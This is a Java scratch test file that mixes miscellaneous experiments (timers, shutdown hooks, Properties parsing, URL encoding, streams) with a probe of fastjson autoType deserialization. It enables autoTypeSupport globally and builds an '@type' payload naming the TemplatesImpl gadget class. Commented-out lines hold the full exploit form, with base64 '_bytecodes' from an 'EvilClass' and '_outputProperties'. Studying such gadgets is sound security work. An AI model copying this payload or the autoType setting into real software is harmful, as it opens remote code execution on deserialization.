package com.hzk.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.google.common.base.Splitter;

import java.io.StringReader;
import java.net.URI;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import java.util.stream.Collectors;

/**
 * <dependency>
*             <groupId>com.alibaba</groupId>
*             <artifactId>fastjson</artifactId>
*             <version>1.2.22</version>
*         </dependency>
 */
public class Test1 {

    static {
        // fastJson，autoType开关
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
    }

    private static class FlameGraphVO {
        private String status;
        private int seconds;

        public FlameGraphVO(String status, int seconds) {
            this.status = status;
            this.seconds = seconds;
        }

        public String getStatus() {
            return status;
        }

        public void setStatus(String status) {
            this.status = status;
        }

        public int getSeconds() {
            return seconds;
        }

        public void setSeconds(int seconds) {
            this.seconds = seconds;
        }
    }

    private static List<String> list = new ArrayList<>();
    private static void sort1(String str, boolean[] visited, StringBuilder sb) {
        if (sb.length() == str.length()) {
            list.add(sb.toString());
            return;
        }
        for (int i = 0; i < str.length(); i++) {
            if (!visited[i]) {
                sb.append(str.charAt(i));
                visited[i] = true;
                sort1(str, visited, sb);
                sb.deleteCharAt(sb.length()-1);
                visited[i] = false;
            }
        }

    }


    public static class ExitSecurityManager extends SecurityManager {
        @Override
        public void checkExit(int status) {
            super.checkExit(status);
            // 打印堆栈跟踪
            Thread.currentThread().dumpStack();
            System.out.println("checkExit");
            // 可以选择退出或不退出
            // System.exit(status);
        }
    }

    public static void main(String[] args) throws Exception {
        System.setProperty("a", "1");

        Runtime.getRuntime().addShutdownHook(new Thread(()->{
            try {
                Thread.currentThread().sleep(1000 * 60 * 60);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }));

        System.exit(1);
        Timer timer1 = new Timer("a");
        timer1.schedule(new TimerTask() {
            @Override
            public void run() {
                System.out.println("aaasaaa");
            }
        }, 100);

        Map<String, String> map1 = new HashMap<>();
        map1.put("a", "a");
        map1.put("b", "b");
        map1.put("c", "c");

        int i = map1.keySet().toString().hashCode();
        System.out.println(i);

        StringBuilder sb = new StringBuilder();
        Thread currentThread = Thread.currentThread();
        StackTraceElement[] stackTraceElements = currentThread.getStackTrace();
        for (StackTraceElement element : stackTraceElements) {
            sb.append(element.getClassName() + "." + element.getMethodName() + "(" + element.getFileName() + ":" + element.getLineNumber() + ")").append("\n");
        }
        System.out.println(sb.toString());
        Date date = new Date(1707206414904L);

        System.out.println(String.format("滚动重启%s服务等待重启时间超过了%d分钟,结束等待", "hzkService", 1L));

        System.out.println(URLEncoder.encode("http://172.19.72.130:9998/monitor/goldeye/arthas/command/exec?line=1"));

        long time = new Date().getTime() + 60000;
        System.out.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(time)));


        byte[] allBytes = new byte[1024];
        byte[] bytes = new byte[] {
                'a','b','c','d'
        };
        byte[] bytes1 = new byte[] {
                'e','f','g'
        };
        System.arraycopy(bytes, 0, allBytes, 0, bytes.length);
        System.arraycopy(bytes1, 0, allBytes, bytes.length, bytes1.length);




        String str1 = "attachmentServer.maxFileSize=1052428800\n" +
                "attachmentServer.tcpUrl={{attachmentServer.ip}}:{{attachmentServer.tcpport}}\n" +
                "attachmentServer.url=http://172.17.51.95:8100/fileserver\n" +
                "attachment.fileserver=https://{{attachment.fileserver.ip_port}}/attachment/download.do?path=/\n" +
                "fileserver.attachment.preview=true\n" +
                "check.file.zip=";

        Properties prop = new Properties();
        StringReader reader = new StringReader(str1);
        prop.load(reader);
//        Map<String, String> map = new HashMap<String, String>((Map) prop);
        Map<String, String> map = (Map) prop;
        String collect = map.entrySet().stream()
                .map(entry -> entry.getKey() + "=" + entry.getValue())
                .collect(Collectors.joining("\n"));

        String urlString1 = "accountId=1150550063915728896&loginConfigNumber=hzk&bizUserId=003&bizCustomParam=myDiyParam666";
        Map<String, String> queryMap = Splitter.onPattern("&").trimResults().withKeyValueSeparator("=").split(urlString1);




        String str = "qwe";
        boolean[] visited = new boolean[str.length()];
        sort1(str, visited, new StringBuilder());
        System.out.println();



        String url = "http://127.0.0.1:8080/aa";
        String params = "?key1=a&key2=%";
        params = URLEncoder.encode(params, "utf-8");
        URI uri = URI.create(url + params);


        System.out.println("start");

        FlameGraphVO flameGraphVO1 = new FlameGraphVO("OK", 30);
        FlameGraphVO flameGraphVO2 = new FlameGraphVO("Error", 40);
        FlameGraphVO flameGraphVO3 = new FlameGraphVO("Error", 30);
        FlameGraphVO flameGraphVO4 = new FlameGraphVO("Error", 50);

        List<FlameGraphVO> list = new ArrayList<>();
        Collections.addAll(list, flameGraphVO1, flameGraphVO2, flameGraphVO3, flameGraphVO4);

        List<FlameGraphVO> list1 = list.stream()
                .filter((tempGraphVO) -> tempGraphVO.getStatus().equals("Error"))
                .sorted(Comparator.comparingInt(FlameGraphVO::getSeconds)).collect(Collectors.toList());


        Timer timer = new Timer();
        timer.schedule(new TimerTask(){
            @Override
            public void run() {
                System.out.println("timer111");
            }
        }, 1000);



        System.in.read();

//        String urlString = "http://localhost:8080/ierp/mobile.html?accountId=1150550063915728896&loginConfigNumber=hzk&bizUserId=003&bizCustomParam=myDiyParam666";
//        URL url = new URL(urlString);
//        String query = url.getQuery();




//        String clazzPath = "target/classes/com/hzk/test/EvilClass.class";
//        byte[] bytes = IOUtils.toByteArray(new FileInputStream(clazzPath));
//        byte[] base64Bytes = Base64.getEncoder().encode(bytes);
//        String evilCode = new String(base64Bytes);

        String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.put("@type", NASTY_CLASS);
//        jsonObject.put("_bytecodes", "[" + evilCode + "],'_name':'a.b','_tfactory':{}");
//        jsonObject.put("_version", "1.0");
//        jsonObject.put("allowedProtocols", "all");
//        jsonObject.put("transletName", "a");



        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type", NASTY_CLASS);
        jsonObject.put("transletName", "a");
        String text1 = JSON.toJSONString(jsonObject);


//        text1 = "{\"@type\":\"" + NASTY_CLASS +
//                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
//                "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
        System.out.println(text1);
        System.out.println("---------------------------------");


        Object object1 = JSON.parseObject(text1);
        System.out.println(object1);







    }


    public static void method1(){
        String userJson = "{\"@type\":\"com.hzk.test.UserDTO\",\"name\":\"testUserName\"}";
        /**
         * construct
         * setName
         * getName
         */
        // JSONObject
        Object object1 = JSON.parseObject(userJson);
        System.out.println("=============");
        //parse
        /**com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
         * construct
         * setName
         */
        // object
//        Object object2 = JSON.parse(userJson);
//        System.out.println(object1);
    }



}
